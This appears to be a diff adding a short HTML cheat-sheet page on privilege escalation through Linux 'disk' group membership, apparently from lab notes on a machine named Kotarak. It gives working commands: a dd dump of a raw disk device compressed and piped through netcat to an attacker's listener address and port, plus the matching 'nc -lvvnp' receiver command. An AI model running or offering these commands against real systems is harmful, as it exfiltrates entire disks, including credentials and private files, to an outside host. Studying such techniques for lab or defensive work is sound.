@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Disk</title>
+</head><body>DISK group is another good group to be a part of<br/>
+ls -la /dev/sd* and see you have rw on disks<br/>
+find the mapper of the disk you want with the 'mount' command (in this case: /dev/mapper/Kotarak--vg-root)<br/>
+Now find where the disk actually is located:<br/>
+&nbsp;&#09;ls /dev/mapper/Kotarak--vg-root -&gt; ../dm-0<br/>
+cd /dev<br/>
+ls -la | grep dm-0&#09;&#09;(check your permissions to ensure you can indeed read)<br/>
+and now compress and send an image over for analysis<br/>
+dd if=/dev/dm-0 | gzip -1 - | nc &lt;LIP&gt; &lt;PORT&gt;<br/>
+obtain disk on attacker side: nc -lvvnp &lt;port&gt; &gt; disk.img.gz<br/>
+<br/>
+gunzip -d disk.img.gz<br/>
+and now read your disk.img<br/>
+</body></html>
